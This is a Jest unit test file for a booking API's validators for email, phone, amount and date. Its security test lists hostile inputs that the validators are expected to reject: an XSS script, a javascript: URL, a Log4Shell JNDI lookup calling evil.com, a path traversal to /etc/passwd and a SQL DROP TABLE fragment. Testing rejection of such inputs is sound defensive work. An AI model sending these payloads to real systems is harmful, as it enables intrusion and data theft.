/**
 * Unit tests for API input validation
 * Tests validation functions and middleware
 */

import { describe, test, expect, beforeEach } from '@jest/globals';
import { validationTestCases } from '../fixtures/testData.js';

// Mock validation functions (would be imported from actual validation module)
const validateEmail = (email) => {
  if (!email || typeof email !== 'string') return false;
  // More strict email validation
  const emailRegex = /^[^\s@]+@[^\s@.][^\s@]*\.[^\s@]+$/;
  return emailRegex.test(email) && !email.includes('..');
};

const validatePhone = (phone) => {
  if (!phone || typeof phone !== 'string') return false;
  const phoneRegex = /^\+?[\d\s\-\(\)]{10,}$/;
  return phoneRegex.test(phone.replace(/[\s\-\(\)]/g, ''));
};

const validateAmount = (amount) => {
  if (typeof amount !== 'number') return false;
  return amount > 0 && amount <= 50000; // Max $50k
};

const validateDate = (dateString) => {
  if (!dateString || typeof dateString !== 'string') return false;
  const date = new Date(dateString);
  const now = new Date();
  const maxFuture = new Date();
  maxFuture.setFullYear(now.getFullYear() + 2);

  return !isNaN(date.getTime()) && date > now && date < maxFuture;
};

const validateBookingData = (data) => {
  const errors = [];

  if (!validateEmail(data.customerEmail)) {
    errors.push('Invalid email address');
  }

  if (!validateAmount(data.amount)) {
    errors.push('Invalid amount: must be between $1 and $50,000');
  }

  if (!validateDate(data.eventDate)) {
    errors.push('Invalid event date: must be in the future within 2 years');
  }

  if (data.phone && !validatePhone(data.phone)) {
    errors.push('Invalid phone number format');
  }

  return {
    isValid: errors.length === 0,
    errors
  };
};

describe('API Validation Functions', () => {
  describe('Email Validation', () => {
    test('should accept valid email addresses', () => {
      const validEmails = [
        'test@example.com',
        'user.name@domain.co.uk',
        'first+last@subdomain.example.org',
        'test123@test-domain.com'
      ];

      validEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });

    test('should reject invalid email addresses', () => {
      validationTestCases.invalidEmail.forEach(email => {
        expect(validateEmail(email)).toBe(false);
      });
    });

    test('should handle edge cases', () => {
      expect(validateEmail(null)).toBe(false);
      expect(validateEmail(undefined)).toBe(false);
      expect(validateEmail(123)).toBe(false);
      expect(validateEmail('')).toBe(false);
    });
  });

  describe('Phone Validation', () => {
    test('should accept valid phone numbers', () => {
      const validPhones = [
        '+1234567890',
        '(555) 123-4567',
        '+1 (555) 123-4567',
        '555-123-4567',
        '5551234567'
      ];

      validPhones.forEach(phone => {
        expect(validatePhone(phone)).toBe(true);
      });
    });

    test('should reject invalid phone numbers', () => {
      validationTestCases.invalidPhone.forEach(phone => {
        expect(validatePhone(phone)).toBe(false);
      });
    });

    test('should handle edge cases', () => {
      expect(validatePhone(null)).toBe(false);
      expect(validatePhone(undefined)).toBe(false);
      expect(validatePhone(123)).toBe(false);
      expect(validatePhone('')).toBe(false);
    });
  });

  describe('Amount Validation', () => {
    test('should accept valid amounts', () => {
      const validAmounts = [1, 100, 500.50, 1299, 49999.99];

      validAmounts.forEach(amount => {
        expect(validateAmount(amount)).toBe(true);
      });
    });

    test('should reject invalid amounts', () => {
      validationTestCases.invalidAmounts.forEach(amount => {
        expect(validateAmount(amount)).toBe(false);
      });
    });

    test('should handle boundary conditions', () => {
      expect(validateAmount(0)).toBe(false);
      expect(validateAmount(0.01)).toBe(true);
      expect(validateAmount(50000)).toBe(true);
      expect(validateAmount(50000.01)).toBe(false);
    });
  });

  describe('Date Validation', () => {
    test('should accept valid future dates', () => {
      const tomorrow = new Date();
      tomorrow.setDate(tomorrow.getDate() + 1);

      const nextMonth = new Date();
      nextMonth.setMonth(nextMonth.getMonth() + 1);

      const nextYear = new Date();
      nextYear.setFullYear(nextYear.getFullYear() + 1);

      const validDates = [
        tomorrow.toISOString().split('T')[0],
        nextMonth.toISOString().split('T')[0],
        nextYear.toISOString().split('T')[0]
      ];

      validDates.forEach(date => {
        expect(validateDate(date)).toBe(true);
      });
    });

    test('should reject invalid dates', () => {
      validationTestCases.invalidDates.forEach(date => {
        expect(validateDate(date)).toBe(false);
      });
    });

    test('should reject past dates', () => {
      const yesterday = new Date();
      yesterday.setDate(yesterday.getDate() - 1);
      expect(validateDate(yesterday.toISOString().split('T')[0])).toBe(false);
    });

    test('should reject dates too far in future', () => {
      const farFuture = new Date();
      farFuture.setFullYear(farFuture.getFullYear() + 5);
      expect(validateDate(farFuture.toISOString().split('T')[0])).toBe(false);
    });
  });

  describe('Booking Data Validation', () => {
    test('should validate complete valid booking data', () => {
      const tomorrow = new Date();
      tomorrow.setDate(tomorrow.getDate() + 1);

      const validBookingData = {
        customerEmail: 'test@example.com',
        amount: 1299,
        eventDate: tomorrow.toISOString().split('T')[0],
        phone: '+1234567890'
      };

      const result = validateBookingData(validBookingData);
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    test('should collect multiple validation errors', () => {
      const invalidBookingData = {
        customerEmail: 'invalid-email',
        amount: -100,
        eventDate: '2023-01-01',
        phone: 'invalid-phone'
      };

      const result = validateBookingData(invalidBookingData);
      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveLength(4);
      expect(result.errors).toContain('Invalid email address');
      expect(result.errors).toContain('Invalid amount: must be between $1 and $50,000');
      expect(result.errors).toContain('Invalid event date: must be in the future within 2 years');
      expect(result.errors).toContain('Invalid phone number format');
    });

    test('should handle missing required fields', () => {
      const incompleteData = {};

      const result = validateBookingData(incompleteData);
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    test('should allow optional phone field to be empty', () => {
      const tomorrow = new Date();
      tomorrow.setDate(tomorrow.getDate() + 1);

      const dataWithoutPhone = {
        customerEmail: 'test@example.com',
        amount: 1299,
        eventDate: tomorrow.toISOString().split('T')[0]
      };

      const result = validateBookingData(dataWithoutPhone);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Security Validation', () => {
    test('should reject potentially malicious inputs', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert(1)',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'DROP TABLE users;'
      ];

      maliciousInputs.forEach(input => {
        expect(validateEmail(input)).toBe(false);
      });
    });

    test('should handle extremely long inputs', () => {
      const longString = 'a'.repeat(10000);
      expect(validateEmail(longString)).toBe(false);
      expect(validatePhone(longString)).toBe(false);
    });

    test('should handle special characters safely', () => {
      const specialChars = ['<>&"\'', null, undefined, {}, []];

      specialChars.forEach(input => {
        expect(() => validateEmail(input)).not.toThrow();
        expect(() => validatePhone(input)).not.toThrow();
        expect(() => validateAmount(input)).not.toThrow();
      });
    });
  });
});